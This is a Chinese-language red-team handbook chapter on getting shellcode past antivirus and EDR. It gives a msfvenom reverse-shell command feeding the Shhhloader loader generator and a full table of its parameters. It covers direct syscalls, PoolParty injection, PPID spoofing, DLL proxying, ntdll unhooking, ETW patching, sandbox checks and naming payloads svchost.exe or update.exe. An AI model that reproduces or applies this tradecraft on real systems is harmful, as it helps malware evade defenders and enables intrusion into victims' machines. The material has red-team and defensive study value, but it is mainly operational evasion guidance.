# 免杀与 EDR 对抗

把 raw shellcode 变成能过现代 AV/EDR 落地执行的加密加载器:EDR 检测面认知 → Shhhloader 生成工艺 → 直接系统调用/PoolParty 原理 → AMSI/ETW 致盲 → 生命周期决策。

本文件工具:Shhhloader(加载器生成)、Yakit(流量/伪装验证辅助 GUI)。
关联文档:原料生成见 [03-漏洞利用与C2.md](03-漏洞利用与C2.md)(msfvenom/Empire);隧道见 06;Windows 落地与 AMSI 一句话补丁见 [13-Windows落地工具箱.md](13-Windows落地工具箱.md);驻留清理见 [17-Windows持久化.md](17-Windows持久化.md)。

## EDR 视角 — 三层检测面:用户态 hook / 内核回调 / ETW

免杀不是"躲扫描器",是把三层数据源各自喂不到料。动手生成加载器前先知道对面在看什么:

| 检测层 | 位置与机制 | 典型看到的东西 | 本文件对应绕法 |
|---|---|---|---|
| ① 用户态 hook | EDR 把自家 DLL 注入每个进程,hook `ntdll` 导出表(`NtAllocateVirtualMemory`/`NtWriteVirtualMemory`/`NtCreateThreadEx` 等),拿到 API 调用序列与参数 | VirtualAlloc+WriteProcessMemory+CreateRemoteThread 三连、跨进程写入、RWX 内存申请 | 直接系统调用(`-sc`,见④节);`-u` 重映射干净 ntdll;注入既存进程(`-p`)减少自建进程遥测 |
| ② 内核回调 | 驱动层:`PsSetCreateProcessNotifyRoutine`(进程创建)、线程/句柄回调、minifilter(文件系统) | 新进程的父子链异常(如 word→cmd)、可执行文件落盘、句柄权限请求 | PPID 欺骗(`-pp`)伪装父进程;代理 DLL(`-dp`)借合法 DLL 外壳;PoolParty(`-m PoolParty`)让目标进程自己执行(见④节) |
| ③ ETW 遥测 | Event Tracing for Windows:内核与 CLR/AMSI 等提供程序把事件写给 EDR/SIEM(脚本内容、.NET 装配加载、内存扫描线索) | PowerShell 脚本块、Assembly.Load、可疑 ntdll 修改 | 载荷走 native C++(Shhhloader 产物,不经 .NET/PS);必要时 ETW 致盲(见⑤节) |

判断环境强度的顺序:任务管理器/autoruns 看进程名(CrowdStrike/SentinelOne/Defender for Endpoint/卡巴)→ 13 号的系统自带条子探路 → 再决定上加载器还是改走 LOLBins(见⑥节)。

## Shhhloader — 加密加载器生成:raw shellcode → 加密 EXE/DLL(全参数实测)

来源:`~/tools/src/Shhhloader/Shhhloader.py`(ICYGuider 的 Syscall Shellcode Loader;`-h` 本机实测输出如下)。
本机依赖已核验:`x86_64-w64-mingw32-gcc`、`clang`、python3 `pefile` 均在;`words_alpha.txt` 已随仓库在目录内(`-w` 离线可用,不会触发其下载逻辑)。

```bash
cd ~/tools/src/Shhhloader
python3 Shhhloader.py -h        # 本机实测:usage 与全部选项
# 原料 = raw shellcode 文件(位置参数)。msfvenom 生成:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<端口> -f raw -o /tmp/sc.bin
# msfvenom 全格式表(-f raw/exe/dll/psh-cmd 等)与编码/加密选项见 03 的 msfvenom 节,此处不重写
python3 Shhhloader.py /tmp/sc.bin -o update.exe        # 默认流:加密+QueueUserAPC+系统调用
python3 Shhhloader.py /tmp/sc.bin -m PoolParty -s domain -sa <目标域> -o svchost.exe   # 高对抗形态
python3 Shhhloader.py /tmp/sc.bin -d -dp apphelp.dll -o apphelp.dll   # 代理 DLL:需把合法 apphelp.dll 拷到当前目录
```

内部工艺(源码核验):每次运行生成随机密钥,对 raw shellcode 逐字节重复异或后嵌入 C++ 桩;字符串用 skCrypter 头加密;syscall 函数名默认随机化;最终调 mingw 交叉编译出 EXE/DLL(EXE 为 console 子系统,DLL 为 windows 子系统)。

全参数表(`-h` 实测,逐个注释):

| 参数 | 默认 | 含义与选择建议 |
|---|---|---|
| `file`(位置参数) | — | 输入:raw shellcode 文件 |
| `-p, --process` | explorer.exe | 注入目标进程:注入既存受信进程比自建进程遥测干净 |
| `-m, --method` | QueueUserAPC | 执行方法,10 选 1:PoolPartyModuleStomping/PoolParty(见④)/ThreadlessInject(线程膜拜注入,配 -cp/-td/-ef)/ModuleStomping(吞并合法模块)/QueueUserAPC(默认,向目标线程 APC 队列投递)/ProcessHollow(傀儡进程,源码会自动在 shellcode 前垫 5000 个 NOP)/EnumDisplayMonitors(回调执行,User32 枚举回调里跑 payload)/RemoteThreadContext(挂起线程+设上下文)/RemoteThreadSuspended(远程线程挂起启动)/CurrentThread(当前进程自执行,无注入动作) |
| `-u, --unhook` | 关 | 运行时先从磁盘重映射干净 ntdll,撤掉 EDR 用户态 hook(对应检测面①) |
| `-w, --word-encode` | 关 | 把 shellcode 字节映射为 256 个英文单词存进桩(熵更低,像字符串表;离线词典 words_alpha.txt) |
| `-nr, --no-randomize` | 关(即默认随机化) | 关闭 syscall 名随机化——别关,随机化就是每次编译产物特征不同 |
| `-ns, --no-sandbox` | 关(默认开沙箱检测) | 关闭反沙箱检查;调试时可关,交付别关 |
| `-l, --llvm-obfuscator` | 关 | 用 clang 的 OLLVM 旗标重编译(源码实测 `-mllvm -bcf -sub -fla -split` 等控制流平坦化/虚假分支;与 SysWhispers 不兼容,会自动降到 GetSyscallStub) |
| `-v, --verbose` | 关 | 载荷运行时打印调试信息——交付物必关 |
| `-sc, --syscall` | GetSyscallStub | 系统调用实现 4 选 1:SysWhispers2(用仓库 SW2Syscalls.h)/SysWhispers3(SW3Syscalls.h,支持间接系统调用)/GetSyscallStub(运行时从 ntdll 现场抓 stub)/None(退回普通 API,只过老 AV) |
| `-d, --dll` | EXE | 生成 DLL 而非 EXE(配 rundll32/COM/服务加载,见 13) |
| `-dp, --dll-proxy` | 关 | 生成代理 DLL:把指定合法 DLL(如 apphelp.dll)拷到当前目录,产物转发其导出+夹带执行,落地后替换原 DLL(配合 17 的 COM 劫持位) |
| `-s, --sandbox` | sleep | 反沙箱手法 5 选 1:sleep(长眠等沙箱超时)/domain(域成员才跑,-sa 给域名)/hostname(主机名匹配)/username(用户名匹配)/dll(特定 DLL 存在才跑) |
| `-sa, --sandbox-arg` | testlab.local | 上面 -s 的匹配值(如目标机主机名/域名) |
| `-o, --outfile` | a.exe | 产物文件名:起个业务味的名字(update/svchost/OneDriveSetup) |
| `-pp, --ppid` | explorer.exe | PPID 欺骗的假父进程(对应检测面②:进程树伪装) |
| `-ppv, --ppid-priv` | 关 | 允许选特权父进程(需要更强权限,默认关) |
| `-np, --no-ppid-spoof` | 关 | 彻底关闭 PPID 欺骗 |
| `-cp, --create-process` | 关 | ThreadlessInject 专属:自建进程再注入,而不是找既存进程 |
| `-td, --target-dll` | ntdll.dll | ThreadlessInject 专属:目标 DLL(在其导出函数上动手脚) |
| `-ef, --export-function` | NtClose | ThreadlessInject 专属:被覆写的导出函数名 |

注意: EXE 产物是 console 子系统(源码编译行实证),双击会闪黑框——投递场景要么配 `-d` 走 DLL,要么用 18 的投递三件套包一层;每次生成密钥随机+syscall 名随机,同一条命令两次产物哈希不同(重打即新样本);PE 里的导入表仍暴露 mingw 特征,极端环境考虑改用 Havoc/Empire 的产物(03);落地与投递路径(certutil 下载即被杀等)见 13 的免杀与 OPSEC 节。

## Yakit — 一体化安全测试平台 GUI(本机 AppImage)

来源:`~/tools/bin/Yakit.AppImage`(Electron 单文件,约 248MB,已具执行位;`--appimage-help` 本机实测)。

```bash
~/tools/bin/Yakit.AppImage                       # 直接启动 GUI(需 FUSE)
~/tools/bin/Yakit.AppImage --appimage-extract-and-run    # 无 FUSE 环境:解包临时目录运行(实测选项)
~/tools/bin/Yakit.AppImage --appimage-portable-home      # 数据随 AppImage 目录走,不落 ~/.config(实测选项)
```

能干什么(清单式;模块名自二进制内嵌文案核验,不虚构具体菜单位置):MITM 交互式劫持——中间人热插拔,可实时查看/改写/投放响应,支持安装自带 CA 证书解 HTTPS;Web Fuzzer——HTTP 请求构造与重放(类 Burp Repeater),配 fuzz tag 做参数爆破;Yak Runner / Yaklang 编程——直接写 yak 脚本调引擎能力(POC/自动化);Codec——编码解码/加密解密瑞士军刀;DNSLog——带外回显验证(出网探测);子域名自动生成与资产管理类功能;插件市场——MITM/页面级插件扩展。首次启动会拉起本地引擎进程并监听本机回环端口,GUI 内操作即用。

在免杀/渗出语境的用法:MITM 劫持用来**校验 C2 流量伪装**——把 C2/渗出流量经代理过 Yakit,看 JA3/头/正文是否像正常业务(21 号④节配套);Web Fuzzer 用来调试渗出通道的 HTTP 伪装参数;DNSLog 验证 DNS 出网后再上 dnscat2(21 号②节)。

## 直接系统调用与 PoolParty — 原理一段(SW2/SW3 头文件本机实证)

直接系统调用(Direct Syscall)解决检测面①:EDR hook 的是 `ntdll` **导出函数**,而真正陷入内核靠的是 ntdll 内部那段 `mov r10, rcx; syscall` 指令序列——加载器跳过导出表,自己内联这段序列按系统调用号直接陷入,hook 层自然看不到。Shhhloader 三种实现(`-sc`,仓库头文件 `SW2Syscalls.h`/`SW3Syscalls.h` 均在本机目录,实证存在):SysWhispers2 为每个用到的 Nt 函数生成独立 stub 源码;SysWhispers3 在此基础上支持**间接系统调用**(经 ntdll 内真实 stub 地址跳转,系统调用返回地址落在 ntdll 里,反"调用栈不在 ntdll"的检测)与 x86/x64;GetSyscallStub(默认)运行时从磁盘干净 ntdll 现场解析出 stub,无需预生成。PoolParty 则解决检测面②:利用 Windows 内核线程池(Thread Pool)机制——攻击者在目标进程外操作其线程池对象(Shhhloader 的 PoolParty 变体经 XOR 编码的 mstscax_shim 载入 mstscax.dll,源码 `xorShimEncode` 以 49 字符随机密钥实证),让**目标进程自己的 worker 线程**取到含 shellcode 的工作项并执行:全程不出现 `CreateRemoteThread`/跨进程写等高危 API,进程树也不多出任何新进程。一句话:系统调用对付"看 API 的",PoolParty 对付"看进程行为的",两层叠加(`-m PoolParty -sc SysWhispers3`)是目前该工具的最高对抗档。

## AMSI / ETW 致盲 — 13 号已有 AMSI,本节补 ETW 思路

AMSI(脚本内容检查)的公开绕过与一句话补丁、编码执行、以及"新版 Defender 基本拦"的结论,13 号"免杀与 OPSEC"节已写全,此处不重写——**最好的 AMSI 绕过是根本不经过 PowerShell**:Shhhloader 产物是 native C++,无脚本内容可供送检。

ETW(检测面③)致盲是思路题,原则**优先"不产生遥测"而非"事后擦"**:

- 载荷侧:native exe(Doc 20 整条线)+ 避免 `Assembly.Load`/`IEX`/下载执行一条龙(都会被 .NET/AMSI 提供程序送出去)。
- 进程内致盲思路:对 `nttdll!EtwEventWrite` 入口打补丁(开头写 `ret`,事件直接丢弃)——与 unhook 同级的内存手术,Shhhloader 的 `-u`(重映射干净 ntdll)撤的是 EDR 的 hook,两者动作不同、目的一致:让本进程遥测出不去。此思路需要自己往桩里加代码,本工具不含现成开关,别指望一条参数。
- 检测与代价:Sysmon/EDR 会盯 ntdll 内存修改(Sysmon ProcessTampering 类事件)与"事件流突然断流"本身——单进程遥测归零恰是显眼信号。所以只在**短窗口高敏动作**(转储凭据那一刻)致盲、平时留白,比全程致盲更像正常进程。
- 更上层:EDR 常把事件直传云端(SIEM/管理台),本地致盲挡不住终端 Agent 自身通道——此时唯一的降遥测法是让动作落在 Agent 看不到的位置(内核态/合法进程上下文),又回到④节的选型。

## 生命周期注意 — 何时自免杀、何时改道 LOLBins/签名滥用,AV 与 EDR 差异

AV ≠ EDR,先分清再花钱:**AV(传统/Defender 本体)** 静态特征+启发式,盯着"文件长什么样"——加密、变形、随机化(Shhhloader 每次产物都不同)对它有效;**EDR(云管全家桶)** 收遥测+拼行为链,盯着"进程干了什么"——文件藏得再好,父子链异常、API 序列、跨进程写入照样报警。所以 EDR 环境里"免杀"的真正含义是**少产生遥测**,不是"文件过扫"。

| 场景 | 推荐 | 理由 |
|---|---|---|
| 仅传统 AV / 老 Defender | Shhhloader 默认流即可 | 特征随机化已够,别过度工程 |
| 新版 Defender(行为引擎) | Shhhloader + `-u` + `-s domain` | unhook+环境自校验,挡基础行为评分 |
| 全家桶 EDR(CS/SentinelOne 等) | `-m PoolParty -sc SysWhispers3 -pp explorer.exe` 档;**但优先考虑不上载荷** | 注入/系统调用仍可能踩内存扫描;改走 13 的系统自带条子(零落地、零遥测)常更划算 |
| 只需枚举/凭据搬运 | LOLBins(13 号条子节) | 系统自带二进制不触发检测面①③ |
| 必须落 EXE 且要过签名校验 | 签名滥用思路:借合法签名工具执行(SigThief 类偷签名工具名)/ `-dp` 代理 DLL | 别迷信签名——EDR 会吊销已知被滥用证书,签名只过粗筛 |

节奏原则:开局用 LOLBins 侦察(21 号①节授权范围内),确认值得后才上加载器;载荷用完即清(17 号每节的清理命令+检测点成对出现);一张盘别重复用一个产物——第一次没报不代表没被采样,云判定延迟到几小时后才爆发很常见;投递物层面的 OPSEC(宏/lnk/邮件)见 18,别在投递与落地用同一套特征。
